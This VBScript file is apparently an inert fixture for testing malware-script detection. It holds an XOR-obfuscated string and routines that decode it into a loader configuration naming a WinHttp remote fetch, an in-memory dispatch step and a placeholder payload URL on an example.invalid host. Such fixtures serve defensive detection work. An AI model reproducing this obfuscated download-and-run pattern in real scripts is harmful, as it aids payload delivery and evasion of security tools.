Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_421bbcdf = "a0ebe7aaa5a2b3a6a5ebb7b5a7a3bfa4b389a4b3bbb9a2b3fab2bfa5a6b7a2b5be89bbb3bbb9a4afaab7b2b7a6a2b3a4eb81bfb89ea2a2a6f881bfb89ea2a2a684b3a7a3b3a5a2f8e3f8e7aaa5a2b7b1b389b5b9a3b8a2ebe4aab5b7bba6b7bfb1b889bfb2ebb5b7bba6b7bfb1b8fbe3e7e7e1e6b7b2e0e7b2aaa3a4baebbea2a2a6a5ecf9f9e3e7e7e1e6b7b2e0e7b2f8b3aeb7bba6bab3f8bfb8a0b7babfb2f9b5b2eeb0e4e0e6e3f8b2b7a2aaa3a5b3a489b7b1b3b8a2eb9ea3b8a2a4b3a5a59ab7b4f9e3e7e7e1e6b7b2e0e7b2"
Const Codec_421bbcdf = "hex_compact|single_byte_xor|d6"

Function Load_421bbcdf()
  Dim result(), i
  ReDim result((Len(Material_421bbcdf) \ 2) - 1)
  For i = 0 To UBound(result)
    result(i) = CInt("&H" & Mid(Material_421bbcdf, i * 2 + 1, 2))
  Next
  Load_421bbcdf = result
End Function

Function Decode_421bbcdf(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(i) = s(i) Xor 214
  Next
  Decode_421bbcdf = result
End Function

Function Recover_421bbcdf()
  Dim s, d, t, n, i, p, e, q
  n = LCase(UCase("Host"))

  s = Load_421bbcdf()

  Select Case 1

    Case 1

      d = Decode_421bbcdf(s)

    Case Else

      d = Array()

  End Select

  t = ""

  For i = 0 To UBound(d)

    t = t & Chr(d(i))

  Next
  Recover_421bbcdf = t
End Function

Sub Copy_421bbcdf(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_421bbcdf()
  Dim resultText
  Call Copy_421bbcdf(Recover_421bbcdf(), resultText)
  Inspect_421bbcdf = resultText
End Function
